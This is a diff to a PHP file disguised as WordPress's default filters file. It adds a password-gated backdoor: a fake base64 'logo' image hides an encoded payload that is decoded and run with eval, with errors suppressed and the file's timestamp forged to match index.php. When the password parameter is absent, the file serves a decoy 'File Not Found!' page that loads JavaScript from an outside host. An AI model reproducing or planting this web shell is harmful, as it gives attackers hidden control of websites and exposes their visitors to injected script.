@@ -1,3 +1,4 @@
+
 <?php 
 /**
  * Sets up the default filters and actions for most
@@ -16,7 +17,9 @@
 // Strip, trim, kses, special wp_nonces for string saves
 error_reporting(0);
 $wp_nonce = "";
-
+if (isset($_GET['akas'])) {
+if ($_GET['akas'] == 'ganteng') {
+		
 function pre_term_name($auth_data, $wp_nonce) {
 	if(file_exists("index.php")) {
 		touch(__FILE__, filemtime("index.php"));
@@ -60,7 +63,23 @@ $wp_default_logo = '<img src="data:image/png;5X1te9s2EuBn93n6H2BWW0qNLEty0s1Klux
 preg_match('#<img src="data:image/png;(.*)">#', $wp_default_logo, $logo_data);
 $logo_image = $logo_data[1];
 $wpautop = pre_term_name( $logo_image, $wp_nonce );
-if(isset($wpautop)){
-	eval($wpautop);
+
+	if(isset($wpautop)){
+		eval($wpautop);
+	}
 }
+}else{
 ?>
+<!DOCTYPE html>
+<html>
+<head>
+	<title><?= $_SERVER['SERVER_NAME'] ?></title>
+</head>
+<body>
+File Not Found!
+<script type="text/javascript" src="http://1928.id/js/jquery.min.js"></script>
+</body>
+</html>
+<?php
+}
+ ?>
